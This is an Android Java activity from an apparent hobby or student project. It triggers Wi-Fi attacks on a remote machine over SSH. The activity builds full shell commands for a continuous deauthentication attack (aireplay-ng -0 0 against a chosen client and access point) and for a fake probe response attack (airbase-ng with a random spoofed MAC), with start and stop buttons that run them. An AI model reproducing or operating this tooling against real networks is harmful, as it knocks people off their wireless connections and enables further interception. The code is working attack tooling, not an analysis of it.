package com.example.kn_project_app;

import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Random;

public class AttackToggle extends AppCompatActivity implements MyCallback {

    TextView nameDevice;
    TextView macAddressDevice;
    TextView nameAccessPoint;
    TextView macAddressAccessPoint;
    Button startAttack;
    Button endAttack;
    TextView channelAndFreq;
    TextView status;

    private boolean mShouldUnbind;
    private SshOperations mBoundService;

    Handler handler;

    private String randomMACAddress(){
        Random rand = new Random();
        byte[] macAddr = new byte[6];
        rand.nextBytes(macAddr);

        macAddr[0] = (byte)(macAddr[0] & (byte)254);  //zeroing last 2 bytes to make it unicast and locally adminstrated

        StringBuilder sb = new StringBuilder(18);
        for(byte b : macAddr){

            if(sb.length() > 0)
                sb.append(":");

            sb.append(String.format("%02x", b));
        }


        return sb.toString();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        handler = new Handler();

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_attack_toggle);

        final Device device = getIntent().getExtras().getParcelable("device");
        Device accessPoint = getIntent().getExtras().getParcelable("accessPoint");
        int attackNumber = getIntent().getExtras().getInt("attackNumber");

        String tempAttackCommand = "";
        String tempEndCommand = "";
        String tempStatusToToastStarted = "";
        String tempStatusToToastEnded = "";

        if (attackNumber == 1){
            tempAttackCommand = "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s deAuth 'airmon-ng stop wlan1; airmon-ng start wlan1 "+ device.getChannel() + " && aireplay-ng -0 0 -a " + device.getBssid() + " -c " + device.getMacAddress() + " wlan1'";
            tempEndCommand = "tmux kill-session -t deAuth; tmux new-session -d -s airodump 'airmon-ng stop wlan1; airmon-ng start wlan1 && airodump-ng wlan1 --output-format netxml -w /tmp/recent'";
            tempStatusToToastStarted = "Deauthentication attack launched";
            tempStatusToToastEnded = "Deauthentication attack terminated";
        }
        else if (attackNumber == 3){
            tempAttackCommand = "tmux kill-session -t kismet; tmux kill-session -t airodump; tmux new-session -d -s fakeProbe 'airbase-ng -a " + randomMACAddress() + " -d " + device.getMacAddress() + " -v -Z 1 -P -C 0.1 wlan1'";
            tempEndCommand = "tmux kill-session -t fakeProbe; tmux new-session -d -s airodump 'airodump-ng wlan1 --output-format netxml -w /tmp/recent'";
            tempStatusToToastStarted = "Fake probe response attack launched";
            tempStatusToToastEnded = "Fake probe response attack terminated";
        }

        final String attackCommand = tempAttackCommand;
        final String endCommand = tempEndCommand;
        final String statusToToastStarted = tempStatusToToastStarted;
        final String statusToToastEnded = tempStatusToToastEnded;

        Log.d("ATTACK NUMER: ", Integer.toString(attackNumber));
        Log.d("KOMENDA: ", attackCommand);

        getSupportActionBar().setTitle(device.getName());

        nameDevice = findViewById(R.id.name);
        macAddressDevice = findViewById(R.id.macAddress);

        nameAccessPoint = findViewById(R.id.nameAccessPoint);
        macAddressAccessPoint = findViewById(R.id.macAddressAccessPoint);

        startAttack = findViewById(R.id.start);
        endAttack = findViewById(R.id.end);

        channelAndFreq = findViewById(R.id.channelAndFreq);
        status = findViewById(R.id.statusOfAttack);

        nameDevice.setText(device.getName());
        macAddressDevice.setText(device.getMacAddress());

        nameAccessPoint.setText(accessPoint.getName());
        macAddressAccessPoint.setText(accessPoint.getMacAddress());

        channelAndFreq.setText("Channel: " + device.getChannel() + " Freq: " + device.getFreqmhz());
        
        startAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.d("WALACH","KLIKNIETO");
                Log.d("--------->", device.getChannel());
                new AttackToggle.executeCommand(AttackToggle.this, attackCommand,statusToToastStarted,"Started").execute();
            }
        });

        endAttack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new AttackToggle.executeCommand(AttackToggle.this,endCommand,statusToToastEnded,"Ended").execute();
            }
        });

    }

    @Override
    protected void onStart(){
        super.onStart();
        doBindService();
    };

    // ---------------------------------------
    // -------- MY CALLBACK METHODS ----------
    // ---------------------------------------

    public void changeAWSStatus(String text) {}
    public void updateText(String text){
        status.setText("Status: " + text);
    }

    // ---------------------------------------
    // ------ CONNECT TO SSH OPERATIONS ------
    // ---------------------------------------

    private ServiceConnection mConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName className, IBinder service) {
            mBoundService = ((SshOperations.LocalBinder)service).getService();
            mBoundService.setMainActivity(AttackToggle.this);
            Toast.makeText(AttackToggle.this,"TEMP: SSH Connection successfully transformed.", Toast.LENGTH_SHORT).show();
        }
        public void onServiceDisconnected(ComponentName className) {
            mBoundService = null;
            Toast.makeText(AttackToggle.this, "Goodbye SSHOperationClass", Toast.LENGTH_SHORT).show();
        }
    };

    void doBindService() {
        if (bindService(new Intent(AttackToggle.this, SshOperations.class), mConnection, Context.BIND_AUTO_CREATE)) {
            mShouldUnbind = true;
        } else {
            Log.e("MY_APP_TAG", "Error: The requested service doesn't " + "exist, or this client isn't allowed access to it.");
        }
    }

    void doUnbindService() {
        if (mShouldUnbind) {
            unbindService(mConnection);
            mShouldUnbind = false;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        doUnbindService();
    }

    // ---------------------------------------
    // - BACKGROUND TASK FOR SENDING COMMAND -
    // ---------------------------------------

    private class executeCommand extends AsyncTask<Integer, Void, Void> {
        MyCallback mainActivity;
        String command;
        String toastText;
        String stringToStatus;
        executeCommand (MyCallback mainActivity, String command, String toastText, String stringToStatus){
            this.mainActivity = mainActivity;
            this.command = command;
            this.toastText = toastText;
            this.stringToStatus = stringToStatus;
        }
        @Override
        protected Void doInBackground(Integer... params) {
            mBoundService.sendCommandToAWS(command);
            mainActivity.updateText(stringToStatus);
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(AttackToggle.this, toastText, Toast.LENGTH_SHORT).show();
                }
            });
            return null;
        }
    }
}
